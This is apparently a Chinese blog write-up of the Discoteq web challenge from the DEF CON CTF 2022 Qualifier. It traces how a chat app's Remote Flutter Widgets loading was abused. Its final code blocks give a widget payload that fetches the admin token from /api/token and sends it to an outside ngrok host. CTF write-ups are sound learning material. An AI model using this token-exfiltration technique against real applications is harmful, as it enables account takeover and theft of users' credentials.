---
title: DEF CON CTF 2022 Qualifier 筆記
catalog: true
date: 2022-06-02 23:27:28
tags: [Security]
categories: [Security]
---

<img src="/img/defcon-2022-qual-writeup/cover.png" style="display:none">

今年的 DEF CON CTF 資格賽跟去年差不多，都是 binary 相關的題目居多，而且今年的需要一堆 reverse 知識，像我這種基本上不會 reverse 的只能在一旁發呆外加幫隊友加油。

不過今年唯一的 web 題（叫做 Discoteq）我倒是覺得滿有趣的，難度不高但滿考驗 debug 跟觀察力以及迅速上手一個新東西的能力，我覺得考的是基本功，而不是對某個語言或是框架的知識，這點還滿棒的。

因為今年就只有這一題好寫，換個方式寫寫看好了，我來照著時間軸寫一下當時解題的想法，時間後面代表從題目釋出過了多久。

<!-- more -->

### 17:40 題目釋出

### 17:44(4m) 開始看題

開始號招隊友一起來看題目，我自己也開始觀察了一下。

這題 Discoteq 基本上就是一個聊天的網站，註冊登入之後可以發送訊息，在接收跟發送訊息的部分都是透過 websocket 來溝通。

![ui](/img/defcon-2022-qual-writeup/p0.png)

除了一般的文字訊息以外，也可以發起投票。

接著主要就是熟悉一下這個網頁在幹嘛，發現沒太多功能以後，我就開始看起 source code。話說這題沒有提供 source code，但畢竟是前端嘛，所以就用 devtool 加減看一下，沒有太多的混淆或是加密，所以可讀性還是滿高的。

### 17:54(14m) 初步想法

這時候我在 source code 裡面用 `/api` 跟 `/flag` 當關鍵字找到一個 API 的 endpoint 叫做 `POST /api/flag`，如果是 admin 身份就可以打這個 API 拿到 flag，從底下截圖中也可以發現程式裡面有個 AdminPage：

![admin page](/img/defcon-2022-qual-writeup/p1.png)

然後這題又有一個 admin bot 會看你的訊息，所以我推測這題可能是要 XSS => 拿到 admin token（存在 localStorage） => 打 API 拿 flag。

不過實際做法還不知道從何下手，繼續看 code。

### 18:09(29m) 發現漏洞以及猜測完整攻擊鍊

繼續玩了一陣子，注意到一個漏洞，那就是送出訊息時的 JSON 長這樣：

``` json
{
  "type": "widget",
  "widget": "/widget/chatmessage",
  "author": {
    "user": "ewfwefoenfof32of<h1 a=\">test</h1#ab525155",
    "platform": "web"
  },
  "recipients": [
    "qdqwd",
    "admin#13371337"
  ],
  "data": {
    "message": "hello"
  }
}
```

送出訊息後，會發現瀏覽器發出一個 request 去 `https://example.com/widget/chatmessage` 拿資料，response 如下：

![chat message](/img/defcon-2022-qual-writeup/p2.png)


文字版：

```
þRFWcorewidgetscoremateriallocalrootloaded        Containerchild    Columnchildren    Rowchildren    TexttextFrom     TexttextauthoruserstylecolorÊÿ    Paddingpadding@child    Texttextdatatitle
loaded    Columnchildrenpoll_options    Rowchildren    Paddingchild    ElevatedButtonchild    Texttexttext    onPressedapi_postpathdataapiVotebody    selectiontextpadding@$@    Texttextcount    
TextButtonchild    TexttextRefreshstylecolorÿÿ    onPressedloaded        ApiMapperurldataapiGetjsonKeyoptionsdataKeypoll_optionsonLoadedloaded
```

看起來是某種經過序列化的東西，而如果我把 widget 的內容改成 `.huli.tw/test`，瀏覽器就會去 `https://example.com.huli.tw/test` 抓東西，因此這邊可以操控 JS 要去哪邊拿這個經過序列化的東西。除了用 `.huli.tw` 以外，也可以用 `@huli.tw`，把前面變成 username 的一部分，這樣就不用額外再設一個 domain，比較方便。

因此我猜測這題就是：

1. 找到怎麼產生這個 widget
2. 用 widget 來 XSS（例如說加上 `<script>` 或是其他 XSS payload）
3. 讓 admin bot 載入你的 widget
4. 拿到 admin token
5. 打 API 拿 flag

因此接下來就是要去看怎麼產生這個 widget，繼續在 source code 裡面找資料。

### 18:26(46m) 繼續研究 source code

在原始碼裡面發現有一個叫做 getChatWidget 的函式就是拿來載入 widget 的，不過需要一點時間研究裡面在幹嘛。

![getChatWidget](/img/defcon-2022-qual-writeup/p3.png)

### 18:35(55m) 確認載入方式

此時確認是一套叫做 [rfw](https://github.com/flutter/packages/tree/main/packages/rfw) 的東西，全稱為 Remote Flutter Widgets。雖然說早在我發現是遠端載入元件時就有用 Google 找到這一套，隊友也有找到這一套，但之前沒有證據所以不敢確認，我怕找錯方向。

之所以後來能確認是因為這邊的程式碼：https://github.com/flutter/packages/blob/main/packages/rfw/lib/src/dart/binary.dart#L32

``` js
/// The first four bytes of a Remote Flutter Widgets binary library blob.
///
/// This signature is automatically added by [encodeLibraryBlob] and is checked
/// in [decodeLibraryBlob].
///
/// See also:
///
///  * [dataBlobSignature], which is the signature for binary data blobs.
const List<int> libraryBlobSignature = <int>[0xFE, 0x52, 0x46, 0x57];
```

這四個 bytes 跟前面看到的 remote widget 吻合，所以確認是用這一套產生的。

接下來就是要研究一下 Flutter 怎麼寫，然後看一下怎麼產生 widget，然後光是把 flutter SDK 裝起來就花了一些時間XD

### 19:03(1h 23m) 解碼 widget

其實 rfw 沒什麼文件，直接看 example 比較快。從 example 裡面找到了把 widget encode/decode 的程式碼，修改一下之後就可以拿來 decode 我們的 `/widget/chatmessage`，內容是這樣：

``` js
widget root = Container({
    child: Column({
        children: [Row({
            children: [Text({
                text: From
            }), Expanded({
                child: Text({
                    text: data.author.user,
                    style: {
                        color: 4278230474
                    }
                })
            })]
        }), Row({
            children: [Expanded({
                child: Text({
                    text: data.data.message
                })
            })]
        })]
    })
});
```

拿來 decode 的程式碼：

``` js
import 'dart:io';

import 'package:rfw/formats.dart';

void main () async {
  final File currentFile = File('chatmessage');
  print(decodeLibraryBlob(await currentFile.readAsBytes()));
}
```

此時我研究的方向是「如何寫一個可以 XSS 的 flutter widget」，我原本想的路有三條：

1. 直接寫入 HTML，像是 React 那樣
2. 直接寫 JS code，例如說 widget 的 onload 事件可以 `eval()` 之類的
3. 用 iframe src 或是 srcdoc 來 XSS

本來想說很簡單嘛，現在就只要找到怎麼在 flutter 裡面塞任意 HTML 就結束了，不過越研究越發現好像不是這麼簡單。原本以為 flutter 是像 React/Vue 那樣，後來才發現是有一整套自己的系統跟語法，是完全不同的東西。

你沒辦法寫 HTML，也沒辦法寫 JS，儘管 iframe 可以用，但那要引入別的 library，用在這題會出錯。

不過因為這時也沒有別的線索，就繼續朝這條路研究。

### 19:37(1h 57m) 去吃飯

原本想說吃完飯前解完的，太天真。

### 20:12(2h 32m) 吃完飯回來繼續戰鬥

### 20:26(2h 46m) 找到正確的方向

此時因為插入 HTML/JS 的路似乎走不通，所以我在想是不是我想錯了方向，這題應該要借助一些現有的機制。

而剛好這個時候隊友也請我幫忙 decode poll widget，看到內容以後就確定這方向才是對的：

``` js
widget root = Container({
    child: Column({
        children: [Row({
                children: [Text({
                    text: From
                }), Text({
                    text: data.author.user,
                    style: {
                        color: 4278230474
                    }
                })]
            }), Padding({
                padding: [0.0, 5.0, 0.0, 0.0],
                child: Text({
                    text: data.data.title
                })
            }),
            switch state.loaded {
                true: Column({
                    children: [...
                        for loop in data.poll_options: Row({
                            children: [Padding({
                                child: ElevatedButton({
                                    child: Text({
                                        text: loop0.text
                                    }),
                                    onPressed: event api_post {
                                        path: data.data.apiVote,
                                        body: {
                                            selection: loop0.text
                                        }
                                    }
                                }),
                                padding: [0.0, 5.0, 10.0, 0.0]
                            }), Text({
                                text: loop0.count
                            })]
                        }), TextButton({
                            child: Text({
                                text: Refresh,
                                style: {
                                    color: 4294942366
                                }
                            }),
                            onPressed: set state.loaded = false
                        })
                    ]
                }),
                null: ApiMapper({
                    url: data.data.apiGet,
                    jsonKey: options,
                    dataKey: poll_options,
                    onLoaded: set state.loaded = true
                })
            }
        ]
    })
});
```

最底下那個 ApiMapper 是關鍵，看起來可以發 API，雖然還不知道發 API 可以幹嘛，但先嘗試看看就對了。

接著我就想辦法在 local 看能不能重新 build 出一樣的 widget，結果怎麼跑都有錯，花了一堆時間。

### 21:11(3h 31m) 找到正確的 build 法

經過各式各樣的嘗試之後，我發現在遠端的檔案中有一個 `local` 的字，但是在本機想重現時，build 出來卻沒有。於是我猜測會不會是前面有個 `import local`，結果還真的是這樣。

此時終於試出來應該要怎樣才能 build 出一個能用 ApiMapper 的 widget。

``` js
import core.widgets;
import core.material;
import local;

widget root = Container(
  child: Column(
    children: [
      Row(
        children: [
          Text( text: 'pewpew' ),
          Expanded(
            child: Text(
              text: data.author.user,
              style: { color: 4278230474 }
            )
          )
        ]
      ),
      Row( 
        children: [
          ApiMapper(
            url: "@example.ngrok.io/json",
            jsonKey: "a",
            dataKey: "a",
            onLoaded: set state.abc = 'abc'
          )
        ]
      )
    ]
  )
);
```

不過做到這步以後又卡關了，因為 ApiMapper 只能送 GET request，沒有辦法 POST，從 source code 裡面也可以證明這點：

![ApiMapper](/img/defcon-2022-qual-writeup/p4.png)

### 21:30(3h 50m) 有其他隊伍解開了

本來想拿 first blood 的，技不如人只好QQ

此時我還在研究 source code，無論是題目的還是 rfw 的都有看一下，看能不能找到更多線索。

### 21:43(4h 03m) 找到其他關鍵

我跟隊友都發現了在 poll widget 裡面有個 `event api_post`，可以拿來送出 POST request，不過觸發的方式不太確定，要試試看。

### 22:22(4h 42m) 成功觸發 event

隊友成功找到了觸發方式：

``` js
Row( 
        children: [
          ApiMapper(
            url: "@example.ngrok.io/json",
            jsonKey: "a",
            dataKey: "a",
            onLoaded: event "api_post" {
              path: "@example.ngrok.io/test",
              body: "bodytest"
            }
          )
        ]
      )
```

我自己其實也有試過一樣的方法，但不知道為什麼沒有成功。

雖然可以發 POST request，可是我們拿不到 response，所以似乎也沒什麼用處。此時又在這邊卡了一陣子。

而我覺得我們應該有忽略什麼重要的細節，才會卡在這邊，不然怎麼看這一步都應該快到結尾了。於是我重新回去玩了一遍 app，看一下有沒有什麼遺漏的地方。

### 22:56(5h 16m) 重回正軌，開始實作 exploit

重新玩了一遍之後果真發現有地方沒注意到，那就是有一個 GET 的 API 是 `/api/token` 可以拿到 token 資料，而用 ApiMapper 拿回來的資料會存在 `data` 裡面，所以可以先用 ApiMapper 拿資料，接著再用 `event "api_post"` 把拿到的資料送出去，就可以獲得 admin token。

概念不難，但難的是實作。在這邊花了一點時間跟隊友分享了一下這個思路，想說大家一起來寫會比較快。

嘗試的過程中發現如果是 ApiMapper 的 onloaded 直接接 `event "api_post"` 的話，好像會拿不到資料，所以需要找其他種方式。這時候就想到了 poll 中出現的 `switch`，應該可以用那一招來做。

話說學習 rfw 的方式是直接看 code，其實註解跟測試寫得都滿詳細的，比文件的資料多很多：https://github.com/flutter/packages/blob/main/packages/rfw/lib/src/dart/text.dart#L479

### 23:19(5h 39m) 失敗的 exploit

我寫了一個我自己覺得怎麼看都會成功的 widget：

``` js
widget root { loaded: 1 } = Container(
  child: Column(
    children: [
      Row( 
        children: [
          Text(
            text: "test"
          ),
          switch state.loaded {
            2: ApiMapper(
              url: "@example.ngrok.io/json",
              jsonKey: "a",
              dataKey: "b",
              onLoaded: event "api_post" {
                path: "@example.ngrok.io/send",
                body: {
                  "token": data.new_token
                }
              },
            ),
            1: ApiMapper(
              url: "/api/token",
              jsonKey: "new_token",
              dataKey: "new_token",
              onLoaded: set state.loaded = 2,
            ),
            default: Text(
              text: 'yo'
            )
          }
        ]
      )
    ]
  )
);
```

但不知道為什麼失敗了，第二個 request 發不出去，只好繼續嘗試其他做法。

### 23:25(5h 45m) 解開囉 🎉

最後是用這樣：

``` js
import core.widgets;
import core.material;
import local;

widget root { loaded: 1 } = Container(
  child: Column(
    children: [
      Row( 
        children: [
          Text(
            text: "test"
          ),
          ApiMapper(
            url: "@example.ngrok.io/json",
            jsonKey: "a",
            dataKey: "b",
            onLoaded: event "api_post" {
              path: "@example.ngrok.io/send",
              body: {
                "token": data.new_token
              }
            },
          ),
          switch state.loaded {
            1: ApiMapper(
              url: "/api/token",
              jsonKey: "new_token",
              dataKey: "new_token",
              onLoaded: set state.loaded = 2,
            ),
            default: Text(
              text: 'yo'
            )
          }
        ]
      )
    ]
  )
);
```

那個 switch 沒功用，拿掉也沒差，只是因為拿之前的改懶得刪而已。

總之概念就是我們可以同時用兩個 ApiMapper，第一個發到我們 server 的讓它先等個 3 秒，如此一來在 `onLoaded` 觸發時，拿 token 的那個 response 已經回來了，於是 `data.new_token` 就是 token，就會送到我們的 server 來。

![token](/img/defcon-2022-qual-writeup/p5.png)

## 總結

最後，總結一下這題的解法：

1. 觀察 App，得出可以載入自訂 widget
2. 學習如何產生合法的 widget
3. 觀察現有的 remote widget，得知有 ApiMapper 跟 api_post 這兩個東西
4. 觀察 App，發現有 `/api/token` 可以拿 token 並且拿到 response
5. 寫一個 widget 能夠先用 ApiMapper 拿 token，再用 api_post 送出


這就是我在開頭所說的，這題難度不高，考的是基本功，而我所謂的基本功指的是：

1. 觀察力：你要能觀察出這題有用 rfw，並且觀察出現有機制是如何運作，包含 `/api/token`、`/api/flag`、各種現成 widget 的邏輯
2. 學習新東西的能力：要快速學習 rfw 的 dart 基本語法
3. 寫 code 的能力：要做出一個能動的 widget，並且使用現有機制讓它動起來

這題的概念不難，而花時間的點在於對 flutter/dart/rfw 不熟，所以中間會一直出一些語法錯誤或是不知道為什麼就是跑不起來的狀況。

而自我檢討的話，大概就是一開始找錯方向，應該再觀察一陣子的。例如說如果在開頭就把 poll 的 widget 也 decode 並且仔細觀察，搞不好可以省不少時間。

話說這次跟了隊伍打了資格賽以後，最大的體悟大概就是如果想要真心享受 DEF CON CTF 的話，還是必須要有基本的 binary 相關知識。我覺得不需要到很強，但至少基本的知識要有（例如說能解出其他 CTF 中很簡單的 pwn 跟 reverse 題？），這樣才比較知道隊友在幹嘛，才能更有參與感。

像我這樣什麼都不會的話，我自己是覺得有點可惜。這感覺大概就好像是，你至少要玩過一點 LOL，看比賽才會知道在幹嘛，才會知道哪邊好看。如果沒玩過的話，基本上是看不懂的，看到玩家開了一個神大絕也沒反應。